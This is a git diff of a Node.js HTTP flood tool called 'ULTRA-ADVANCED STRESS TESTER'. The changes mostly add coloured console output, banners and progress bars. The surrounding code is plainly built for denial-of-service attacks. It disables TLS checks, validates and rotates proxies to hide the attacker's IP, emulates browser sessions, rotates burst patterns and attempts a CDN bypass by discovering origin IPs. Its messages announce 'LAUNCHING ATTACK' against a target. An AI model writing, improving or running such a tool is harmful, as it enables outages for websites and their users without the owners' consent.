@@ -16,15 +16,57 @@ const { URL } = require('url');
 // Disable TLS certificate validation globally to prevent "unable to verify leaf signature" errors
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
+// ANSI Color Codes for beautiful output
+const colors = {
+    reset: '\x1b[0m',
+    bright: '\x1b[1m',
+    dim: '\x1b[2m',
+    red: '\x1b[31m',
+    green: '\x1b[32m',
+    yellow: '\x1b[33m',
+    blue: '\x1b[34m',
+    magenta: '\x1b[35m',
+    cyan: '\x1b[36m',
+    white: '\x1b[37m',
+    bgRed: '\x1b[41m',
+    bgGreen: '\x1b[42m',
+    bgYellow: '\x1b[43m',
+    bgBlue: '\x1b[44m'
+};
+
+const icons = {
+    success: '✓',
+    error: '✗',
+    warning: '⚠',
+    info: 'ℹ',
+    rocket: '→',
+    fire: '⚡',
+    target: '◉',
+    clock: '⏱',
+    chart: '▶',
+    check: '●'
+};
+
 const BANNER = `
-+==============================================================+
-|    ULTRA-ADVANCED STRESS TESTER V7.0 - PERFECT EDITION      |
-|    Smart Proxies + Adaptive AI + Session Emulation          |
-|    > Adaptive Concurrency   > Attack Pattern Rotation       |
-|    > Weighted Proxy Select  > Exponential Backoff           |
-|    > HTTP/2 Support         > Cookie Session Tracking       |
-|    > Random POST Bodies     > Auto Proxy Recovery           |
-+==============================================================+
+${colors.cyan}${colors.bright}
+╔══════════════════════════════════════════════════════════════════╗
+║                                                                  ║
+║     ${colors.magenta}██╗   ██╗██╗  ████████╗██████╗  █████╗     ██╗   ██╗███████╗${colors.cyan}    ║
+║     ${colors.magenta}██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██║   ██║╚════██║${colors.cyan}    ║
+║     ${colors.magenta}██║   ██║██║     ██║   ██████╔╝███████║    ██║   ██║    ██╔╝${colors.cyan}    ║
+║     ${colors.magenta}██║   ██║██║     ██║   ██╔══██╗██╔══██║    ╚██╗ ██╔╝   ██╔╝${colors.cyan}     ║
+║     ${colors.magenta}╚██████╔╝███████╗██║   ██║  ██║██║  ██║     ╚████╔╝    ██║${colors.cyan}      ║
+║      ${colors.magenta}╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝      ╚═══╝     ╚═╝${colors.cyan}      ║
+║                                                                  ║
+║        ${colors.yellow}${colors.bright}PERFECT EDITION${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.green}Smart AI${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.blue}Adaptive Engine${colors.cyan}        ║
+║                                                                  ║
+║  ${colors.green}${icons.success} Adaptive Concurrency${colors.cyan}     ${colors.green}${icons.success} HTTP/2 Support${colors.cyan}                  ║
+║  ${colors.green}${icons.success} Weighted Proxy Select${colors.cyan}    ${colors.green}${icons.success} Session Emulation${colors.cyan}               ║
+║  ${colors.green}${icons.success} Pattern Rotation${colors.cyan}         ${colors.green}${icons.success} Exponential Backoff${colors.cyan}             ║
+║  ${colors.green}${icons.success} Random POST Bodies${colors.cyan}       ${colors.green}${icons.success} Cookie Tracking${colors.cyan}                 ║
+║                                                                  ║
+╚══════════════════════════════════════════════════════════════════╝
+${colors.reset}
 `;
 
 const BROWSER_PROFILES = [
@@ -155,6 +197,20 @@ function question(query) {
 
 function getRandomElement(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
+}
+
+function createProgressBar(current, total, width = 40) {
+    const percentage = Math.min((current / total) * 100, 100);
+    const filled = Math.floor((width * current) / total);
+    const empty = width - filled;
+    
+    let bar = '[';
+    bar += colors.green + '█'.repeat(filled) + colors.reset;
+    bar += colors.dim + '░'.repeat(empty) + colors.reset;
+    bar += ']';
+    
+    const percentStr = `${percentage.toFixed(1)}%`;
+    return `${bar} ${colors.cyan}${percentStr}${colors.reset}`;
 }
 
 function getAdvancedHeaders(url, profile = null) {
@@ -453,9 +509,9 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
             return false;
         }
         
-        console.log('\n' + '='.repeat(70));
-        console.log(`[*] LOADING PROXIES`);
-        console.log('='.repeat(70));
+        console.log('\n' + colors.cyan + '═'.repeat(70) + colors.reset);
+        console.log(`${colors.bright}${colors.blue}${icons.rocket} LOADING PROXIES${colors.reset}`);
+        console.log(colors.cyan + '═'.repeat(70) + colors.reset);
         
         const proxyList = raw.map(proxy => 
             proxy.startsWith('http') ? proxy : `http://${proxy}`
@@ -463,18 +519,17 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
         
         if (!validateProxies || !targetUrl) {
             config.proxies = proxyList;
-            console.log(`[+] Loaded ${config.proxies.length} proxies (no validation)`);
-            console.log(`[+] Proxies will be used in rotation during attack`);
-            console.log('='.repeat(70) + '\n');
+            console.log(`${colors.green}${icons.success} Loaded ${colors.bright}${config.proxies.length}${colors.reset}${colors.green} proxies (no validation)${colors.reset}`);
+            console.log(`${colors.blue}${icons.info} Proxies will be used in rotation during attack${colors.reset}`);
+            console.log(colors.cyan + '═'.repeat(70) + colors.reset + '\n');
             return true;
         }
         
-        console.log(`[*] Validating ${proxyList.length} proxies against target...`);
-        console.log(`[*] Testing: ${targetUrl}`);
-        console.log(`[*] Mode: PRECISION - 3-tier validation (dead check > speed test > reliability)`);
-        console.log(`[*] Timeout: 800ms dead check | 1500ms speed test | 2000ms final`);
-        console.log(`[*] Concurrency: 1500 simultaneous (MAXIMUM SPEED)`);
-        console.log('='.repeat(70) + '\n');
+        console.log(`${colors.yellow}${icons.target} Validating ${colors.bright}${proxyList.length}${colors.reset}${colors.yellow} proxies against target...${colors.reset}`);
+        console.log(`${colors.blue}${icons.info} Testing: ${colors.bright}${targetUrl}${colors.reset}`);
+        console.log(`${colors.magenta}${icons.fire} Mode: ${colors.bright}PRECISION${colors.reset}${colors.magenta} - 2-phase validation${colors.reset}`);
+        console.log(`${colors.dim}${icons.clock} Phase 1: 800ms | Phase 2: 1500ms | Concurrency: 1500${colors.reset}`);
+        console.log(colors.cyan + '═'.repeat(70) + colors.reset + '\n');
         
         const startTime = Date.now();
         const chunkSize = 1500;
@@ -483,7 +538,7 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
         const proxyMetrics = new Map(); // Store latency and status for sorting
         
         // Phase 1: Ultra-fast dead proxy elimination
-        console.log('[PHASE 1] Eliminating dead proxies (800ms timeout)...');
+        console.log(`${colors.bright}${colors.yellow}[PHASE 1]${colors.reset} ${colors.yellow}Eliminating dead proxies...${colors.reset}`);
         const phase1Start = Date.now();
         const aliveProxies = [];
         
@@ -527,22 +582,23 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
             
             const progress = Math.min(i + chunkSize, proxyList.length);
             const speed = Math.floor(progress / (Date.now() - phase1Start) * 1000);
-            process.stdout.write(`\r  [>] Progress: ${progress}/${proxyList.length} | Alive: ${aliveProxies.length} | Speed: ${speed}/s`);
+            const progressBar = createProgressBar(progress, proxyList.length, 35);
+            process.stdout.write(`\r  ${progressBar} ${colors.green}${aliveProxies.length} alive${colors.reset} ${colors.dim}│${colors.reset} ${colors.cyan}${speed}/s${colors.reset}`);
         }
         
         const phase1Time = ((Date.now() - phase1Start) / 1000).toFixed(1);
         const eliminatedCount = proxyList.length - aliveProxies.length;
         const eliminatedPercent = ((eliminatedCount / proxyList.length) * 100).toFixed(1);
         
-        console.log(`\n  [+] Eliminated ${eliminatedCount} dead proxies (${eliminatedPercent}%) in ${phase1Time}s\n`);
+        console.log(`\n  ${colors.green}${icons.success} Eliminated ${colors.red}${eliminatedCount}${colors.reset}${colors.green} dead proxies (${eliminatedPercent}%) in ${colors.bright}${phase1Time}s${colors.reset}\n`);
         
         if (aliveProxies.length === 0) {
-            console.log('[!] NO ALIVE PROXIES FOUND!\n');
+            console.log(`${colors.red}${icons.error} NO ALIVE PROXIES FOUND!${colors.reset}\n`);
             return false;
         }
         
         // Phase 2: Speed and reliability test on alive proxies
-        console.log(`[PHASE 2] Testing ${aliveProxies.length} alive proxies for speed & reliability...`);
+        console.log(`${colors.bright}${colors.green}[PHASE 2]${colors.reset} ${colors.green}Testing ${colors.bright}${aliveProxies.length}${colors.reset}${colors.green} alive proxies for speed & reliability...${colors.reset}`);
         const phase2Start = Date.now();
         
         for (let i = 0; i < aliveProxies.length; i += chunkSize) {
@@ -550,7 +606,7 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
             const batchNum = Math.floor(i / chunkSize) + 1;
             const totalBatches = Math.ceil(aliveProxies.length / chunkSize);
             
-            console.log(`[BATCH ${batchNum}/${totalBatches}] Testing ${chunk.length} proxies...`);
+            console.log(`\n${colors.cyan}${icons.chart} Batch ${batchNum}/${totalBatches}${colors.reset} ${colors.dim}(${chunk.length} proxies)${colors.reset}`);
             
             const results = await Promise.all(
                 chunk.map(async (proxy) => {
@@ -612,12 +668,13 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
             const eta = remaining > 0 ? Math.ceil(remaining / speed) : 0;
             
             if (batchValid.length > 0) {
-                console.log(`  [+] Validated ${batchValid.length} | Fast(<500ms): ${fastCount} | Medium: ${mediumCount} | Slow: ${slowCount}`);
+                console.log(`  ${colors.green}${icons.success} Validated ${colors.bright}${batchValid.length}${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}Fast: ${fastCount}${colors.reset} ${colors.dim}│${colors.reset} ${colors.yellow}Medium: ${mediumCount}${colors.reset} ${colors.dim}│${colors.reset} ${colors.red}Slow: ${slowCount}${colors.reset}`);
             } else {
-                console.log(`  [-] Validated 0 proxies in this batch`);
+                console.log(`  ${colors.red}${icons.error} Validated 0 proxies in this batch${colors.reset}`);
             }
             
-            console.log(`  [i] Progress: ${totalTested}/${aliveProxies.length} | Speed: ${speed}/s | ETA: ${eta}s\n`);
+            const progressBar = createProgressBar(totalTested, aliveProxies.length, 30);
+            console.log(`  ${progressBar} ${colors.cyan}${speed}/s${colors.reset} ${colors.dim}│ ETA: ${eta}s${colors.reset}`);
         }
         
         // Sort proxies by quality score
@@ -631,21 +688,22 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
         const avgSpeed = Math.floor(proxyList.length / (Date.now() - startTime) * 1000);
         const finalRate = ((config.proxies.length / proxyList.length) * 100).toFixed(1);
         
-        console.log('='.repeat(70));
-        console.log('[+] VALIDATION COMPLETE - PROXIES SORTED BY QUALITY');
-        console.log('='.repeat(70));
-        console.log(`[+] Total Time: ${totalTime}s | Average Speed: ${avgSpeed} proxies/sec`);
-        console.log(`[+] Result: ${config.proxies.length}/${proxyList.length} working (${finalRate}%)`);
+        console.log('\n' + colors.cyan + '═'.repeat(70) + colors.reset);
+        console.log(`${colors.bright}${colors.green}${icons.success} VALIDATION COMPLETE - PROXIES SORTED BY QUALITY${colors.reset}`);
+        console.log(colors.cyan + '═'.repeat(70) + colors.reset);
+        console.log(`${colors.blue}${icons.clock} Total Time: ${colors.bright}${totalTime}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.blue}Avg Speed: ${colors.bright}${avgSpeed} p/s${colors.reset}`);
+        console.log(`${colors.green}${icons.check} Result: ${colors.bright}${config.proxies.length}${colors.reset}${colors.green}/${proxyList.length} working ${colors.dim}(${finalRate}%)${colors.reset}`);
         
         if (config.proxies.length > 0) {
             // Show top 5 best proxies with their metrics
-            console.log(`\n[TOP 5 BEST PROXIES]`);
+            console.log(`\n${colors.bright}${colors.yellow}[TOP 5 BEST PROXIES]${colors.reset}`);
             const top5 = config.proxies.slice(0, 5);
             top5.forEach((proxy, idx) => {
                 const metrics = proxyMetrics.get(proxy);
                 const proxyIP = proxy.replace(/^https?:\/\//, '');
-                const quality = metrics.score > 80 ? 'EXCELLENT' : metrics.score > 60 ? 'GOOD' : 'AVERAGE';
-                console.log(`  ${idx + 1}. ${proxyIP} | ${metrics.latency}ms | Status ${metrics.status} | Score: ${metrics.score.toFixed(1)} (${quality})`);
+                const quality = metrics.score > 80 ? `${colors.green}EXCELLENT` : metrics.score > 60 ? `${colors.yellow}GOOD` : `${colors.red}AVERAGE`;
+                const medal = idx === 0 ? '🥇' : idx === 1 ? '🥈' : idx === 2 ? '🥉' : `${colors.dim}${idx + 1}.${colors.reset}`;
+                console.log(`  ${medal} ${colors.cyan}${proxyIP.padEnd(25)}${colors.reset} ${colors.dim}│${colors.reset} ${colors.blue}${metrics.latency}ms${colors.reset} ${colors.dim}│${colors.reset} Status ${colors.magenta}${metrics.status}${colors.reset} ${colors.dim}│${colors.reset} Score ${quality} ${metrics.score.toFixed(1)}${colors.reset}`);
             });
             
             // Speed distribution
@@ -656,12 +714,12 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
             }).length;
             const slow = config.proxies.length - fast - medium;
             
-            console.log(`\n[SPEED DISTRIBUTION]`);
-            console.log(`  Fast (<500ms):   ${fast} proxies (${((fast / config.proxies.length) * 100).toFixed(1)}%)`);
-            console.log(`  Medium (500-1s): ${medium} proxies (${((medium / config.proxies.length) * 100).toFixed(1)}%)`);
-            console.log(`  Slow (>1s):      ${slow} proxies (${((slow / config.proxies.length) * 100).toFixed(1)}%)`);
+            console.log(`\n${colors.bright}${colors.magenta}[SPEED DISTRIBUTION]${colors.reset}`);
+            console.log(`  ${colors.green}${icons.fire} Fast (<500ms):   ${colors.bright}${fast}${colors.reset}${colors.green} proxies ${colors.dim}(${((fast / config.proxies.length) * 100).toFixed(1)}%)${colors.reset}`);
+            console.log(`  ${colors.yellow}${icons.fire} Medium (500-1s): ${colors.bright}${medium}${colors.reset}${colors.yellow} proxies ${colors.dim}(${((medium / config.proxies.length) * 100).toFixed(1)}%)${colors.reset}`);
+            console.log(`  ${colors.red}${icons.fire} Slow (>1s):      ${colors.bright}${slow}${colors.reset}${colors.red} proxies ${colors.dim}(${((slow / config.proxies.length) * 100).toFixed(1)}%)${colors.reset}`);
         }
-        console.log('='.repeat(70) + '\n');
+        console.log(colors.cyan + '═'.repeat(70) + colors.reset + '\n');
         
         if (config.proxies.length === 0) {
             console.log('[!] NO WORKING PROXIES FOUND!');
@@ -748,28 +806,56 @@ function displayStats() {
     const memUsage = process.memoryUsage();
     const memMB = (memUsage.heapUsed / 1024 / 1024).toFixed(0);
     
-    console.log('\n' + '='.repeat(70));
-    console.log(`[STATS] Time: ${elapsed.toFixed(1)}s | Requests: ${config.stats.totalRequests.toLocaleString()} | Rate: ${reqRate.toFixed(0)} req/s`);
-    console.log(`[STATS] Success: ${config.stats.successful.toLocaleString()} (${successRate}%) | Failed: ${config.stats.failed.toLocaleString()}`);
-    console.log(`[STATS] HTTP/2: ${config.stats.http2Requests} (${http2Percent}%) | Conn Reuse: ${config.stats.connectionReuse}`);
-    console.log(`[STATS] Memory: ${memMB}MB | Sent: ${(config.stats.bytesSent / 1024).toFixed(0)} KB | Received: ${(config.stats.bytesReceived / 1024).toFixed(0)} KB`);
-    console.log(`[ADAPTIVE] Concurrency: ${config.stats.adaptiveMetrics.currentConcurrency} | Success Rate: ${config.stats.adaptiveMetrics.lastSuccessRate.toFixed(1)}% | Pattern: ${config.attackPattern.toUpperCase()}`);
+    // Visual indicators
+    const rateColor = reqRate > 10000 ? colors.green : reqRate > 5000 ? colors.yellow : colors.red;
+    const successColor = successRate > 80 ? colors.green : successRate > 50 ? colors.yellow : colors.red;
+    const patternIcon = config.attackPattern === 'burst' ? '⚡' : config.attackPattern === 'steady' ? '▶' : '↔';
+    
+    console.log('\n' + colors.cyan + '═'.repeat(70) + colors.reset);
+    console.log(`${colors.bright}${colors.blue}${icons.chart} PERFORMANCE METRICS${colors.reset}`);
+    console.log(colors.cyan + '─'.repeat(70) + colors.reset);
+    
+    // Main stats line
+    console.log(`${colors.blue}${icons.clock} Time: ${colors.bright}${elapsed.toFixed(1)}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.magenta}${icons.target} Requests: ${colors.bright}${config.stats.totalRequests.toLocaleString()}${colors.reset} ${colors.dim}│${colors.reset} ${rateColor}${icons.fire} Rate: ${colors.bright}${reqRate.toFixed(0)} req/s${colors.reset}`);
+    
+    // Success/Fail line
+    console.log(`${successColor}${icons.success} Success: ${colors.bright}${config.stats.successful.toLocaleString()}${colors.reset}${successColor} (${successRate}%)${colors.reset} ${colors.dim}│${colors.reset} ${colors.red}${icons.error} Failed: ${colors.bright}${config.stats.failed.toLocaleString()}${colors.reset}`);
+    
+    // Protocol info
+    console.log(`${colors.cyan}${icons.info} HTTP/2: ${colors.bright}${config.stats.http2Requests}${colors.reset}${colors.cyan} (${http2Percent}%)${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}${icons.check} Conn Reuse: ${colors.bright}${config.stats.connectionReuse}${colors.reset}`);
+    
+    // Resources
+    console.log(`${colors.yellow}${icons.info} Memory: ${colors.bright}${memMB}MB${colors.reset} ${colors.dim}│${colors.reset} ${colors.blue}Sent: ${colors.bright}${(config.stats.bytesSent / 1024).toFixed(0)} KB${colors.reset} ${colors.dim}│${colors.reset} ${colors.magenta}Received: ${colors.bright}${(config.stats.bytesReceived / 1024).toFixed(0)} KB${colors.reset}`);
+    
+    // Adaptive metrics
+    const concurrencyBar = '█'.repeat(config.stats.adaptiveMetrics.currentConcurrency) + colors.dim + '░'.repeat(10 - config.stats.adaptiveMetrics.currentConcurrency) + colors.reset;
+    console.log(colors.cyan + '─'.repeat(70) + colors.reset);
+    console.log(`${colors.bright}${colors.green}[ADAPTIVE ENGINE]${colors.reset}`);
+    console.log(`${colors.yellow}${patternIcon} Pattern: ${colors.bright}${config.attackPattern.toUpperCase()}${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}Concurrency: ${colors.bright}${config.stats.adaptiveMetrics.currentConcurrency}${colors.reset} ${colors.green}${concurrencyBar}${colors.reset}`);
+    console.log(`${successColor}${icons.target} Success Rate: ${colors.bright}${config.stats.adaptiveMetrics.lastSuccessRate.toFixed(1)}%${colors.reset}`);
     
     if (Object.keys(config.stats.statusCodes).length > 0) {
+        console.log(colors.cyan + '─'.repeat(70) + colors.reset);
+        console.log(`${colors.magenta}${icons.info} Status Codes:${colors.reset}`);
         const codes = Object.entries(config.stats.statusCodes)
-            .sort(([a], [b]) => a - b)
-            .map(([k, v]) => `${k}:${v}`)
-            .join(', ');
-        console.log(`[STATS] Status Codes: ${codes}`);
+            .sort(([a], [b]) => b - a)
+            .slice(0, 5)
+            .map(([k, v]) => {
+                const codeColor = k.startsWith('2') ? colors.green : k.startsWith('3') ? colors.blue : k.startsWith('4') ? colors.yellow : colors.red;
+                return `${codeColor}${k}${colors.reset}${colors.dim}:${colors.reset}${colors.bright}${v}${colors.reset}`;
+            })
+            .join(' ${colors.dim}│${colors.reset} ');
+        console.log(`  ${codes}`);
     }
     
     if (config.proxies.length > 0 && config.workingProxies.size > 0) {
-        const workingIPs = Array.from(config.workingProxies).slice(0, 10).join(', ');
-        const extra = config.workingProxies.size > 10 ? ` ... (+${config.workingProxies.size - 10} more)` : '';
-        console.log(`[STATS] Working Proxies: ${config.workingProxies.size} | IPs: ${workingIPs}${extra}`);
+        console.log(colors.cyan + '─'.repeat(70) + colors.reset);
+        const proxyCount = config.workingProxies.size;
+        const proxyColor = proxyCount > 100 ? colors.green : proxyCount > 50 ? colors.yellow : colors.red;
+        console.log(`${proxyColor}${icons.check} Working Proxies: ${colors.bright}${proxyCount}${colors.reset}${proxyColor}/${config.proxies.length}${colors.reset}`);
     }
     
-    console.log('='.repeat(70));
+    console.log(colors.cyan + '═'.repeat(70) + colors.reset);
 }
 
 class HTTPFlood {
@@ -785,52 +871,50 @@ class HTTPFlood {
     }
     
     async prepare() {
-        console.log(`\n[*] Preparing ${this.method} flood attack...`);
-        console.log(`[*] Target: ${this.url}`);
-        console.log(`[*] Duration: ${this.duration}s`);
-        console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: ADAPTIVE (3-10 concurrent/thread, auto-tuned)`);
-        console.log(`[*] Pattern: Rotating (burst->steady->mixed, 30s cycles)`);
-        console.log(`[*] Proxies: Weighted selection (best 3x more likely)`);
-        console.log(`[*] Recovery: Exponential backoff + 30s temp bans`);
-        console.log(`[*] Session: Cookie tracking + realistic navigation`);
-        console.log(`[*] Protocol: HTTP/1.1 + HTTP/2 (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)`);
-        console.log(`[*] Connection: ${config.proxies.length > 0 ? '2048' : '1024'} socket pool + Keep-Alive`);
-        console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
-        if (config.proxies.length > 0) {
-            console.log(`[*] Proxy: Simple rotation after 3 fails`);
-            console.log(`[*] Proxy: 10 second timeout for slow proxies`);
-            if (config.maxRPS) {
-                console.log(`[*] RPS Limit: ${config.maxRPS.toLocaleString()} requests/second (controlled)`);
-            }
-        }
+        console.log(`\n${colors.cyan}${'═'.repeat(70)}${colors.reset}`);
+        console.log(`${colors.bright}${colors.red}${icons.target} ATTACK CONFIGURATION${colors.reset}`);
+        console.log(`${colors.cyan}${'═'.repeat(70)}${colors.reset}`);
+        console.log(`${colors.yellow}${icons.rocket} Method: ${colors.bright}${this.method}${colors.reset}`);
+        console.log(`${colors.blue}${icons.target} Target: ${colors.bright}${this.url}${colors.reset}`);
+        console.log(`${colors.magenta}${icons.clock} Duration: ${colors.bright}${this.duration}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}${icons.fire} Threads: ${colors.bright}${this.threads}${colors.reset}`);
+        console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
+        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}ADAPTIVE${colors.reset}${colors.green} (3-10 concurrent/thread, auto-tuned)${colors.reset}`);
+        console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}Rotating${colors.reset}${colors.yellow} (burst→steady→mixed, 30s cycles)${colors.reset}`);
+        console.log(`${colors.magenta}${icons.check} Proxies: ${colors.bright}Weighted selection${colors.reset}${colors.magenta} (best 3x more likely)${colors.reset}`);
+        console.log(`${colors.blue}${icons.info} Recovery: ${colors.bright}Exponential backoff${colors.reset}${colors.blue} + 30s temp bans${colors.reset}`);
+        console.log(`${colors.cyan}${icons.success} Session: ${colors.bright}Cookie tracking${colors.reset}${colors.cyan} + realistic navigation${colors.reset}`);
+        console.log(`${colors.green}${icons.info} Protocol: ${colors.bright}HTTP/1.1 + HTTP/2${colors.reset}${colors.green} (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)${colors.reset}`);
+        console.log(`${colors.yellow}${icons.check} Connection: ${colors.bright}${config.proxies.length > 0 ? '2048' : '1024'} socket pool${colors.reset}${colors.yellow} + Keep-Alive${colors.reset}`);
         
         const baseRPS = config.proxies.length > 0 ? 250 : 500;
         const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 50000 : 100000));
-        console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()} req/s`);
+        console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
+        console.log(`${colors.bright}${colors.green}${icons.fire} Estimated Throughput: ${colors.yellow}${estimatedRPS.toLocaleString()}${colors.reset}${colors.green} - ${colors.yellow}${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()}${colors.reset}${colors.green} req/s${colors.reset}`);
         
         if (this.threads > 100) {
-            console.log(`[!] WARNING: ${this.threads} threads may overwhelm MacBook Air M2`);
-            console.log(`[!] Recommended: 50-80 threads for optimal performance`);
+            console.log(`${colors.yellow}${icons.warning} WARNING: ${colors.bright}${this.threads}${colors.reset}${colors.yellow} threads may overwhelm MacBook Air M2${colors.reset}`);
+            console.log(`${colors.blue}${icons.info} Recommended: ${colors.bright}50-80 threads${colors.reset}${colors.blue} for optimal performance${colors.reset}`);
         }
         
         if (this.useOrigin && this.domain) {
+            console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
+            console.log(`${colors.magenta}${icons.target} Attempting CDN bypass...${colors.reset}`);
             this.originIPs = await discoverOriginIPs(this.domain);
         }
         
         if (config.proxies.length > 0) {
-            console.log(`[*] Using ${config.proxies.length} proxies with rotation`);
-            console.log(`[!] Enable debug mode to see errors (first 10 only)`);
-            console.log(`[!] ECONNABORTED = proxy timeout, will auto-rotate`);
-            
-            if (this.threads > 150) {
-                console.log(`[!] MacBook Air M2: Consider using 50-80 threads for stability`);
+            console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
+            console.log(`${colors.green}${icons.check} Using ${colors.bright}${config.proxies.length}${colors.reset}${colors.green} proxies with smart rotation${colors.reset}`);
+            if (config.maxRPS) {
+                console.log(`${colors.blue}${icons.info} RPS Limit: ${colors.bright}${config.maxRPS.toLocaleString()}${colors.reset}${colors.blue} requests/second (controlled)${colors.reset}`);
             }
-            
             config.workingProxies.clear();
         } else {
-            console.log('[!] WARNING: Direct connection - your IP is visible!');
+            console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
+            console.log(`${colors.red}${icons.warning} WARNING: Direct connection - your IP is visible!${colors.reset}`);
         }
+        
+        console.log(`${colors.cyan}${'═'.repeat(70)}${colors.reset}`);
         
         config.stats.startTime = Date.now();
         this.running = true;
@@ -1068,7 +1152,7 @@ class HTTPFlood {
     async start() {
         await this.prepare();
         
-        console.log(`[*] Starting attack with ${this.threads} async workers...`);
+        console.log(`\n${colors.bright}${colors.green}${icons.rocket} LAUNCHING ATTACK...${colors.reset}\n`);
         
         const workers = [];
         for (let i = 0; i < this.threads; i++) {
@@ -1087,7 +1171,7 @@ class HTTPFlood {
         clearInterval(statsInterval);
         
         displayStats();
-        console.log('\n[+] Attack completed!');
+        console.log(`\n${colors.bright}${colors.green}${icons.success} ATTACK COMPLETED!${colors.reset}\n`);
     }
 }
 
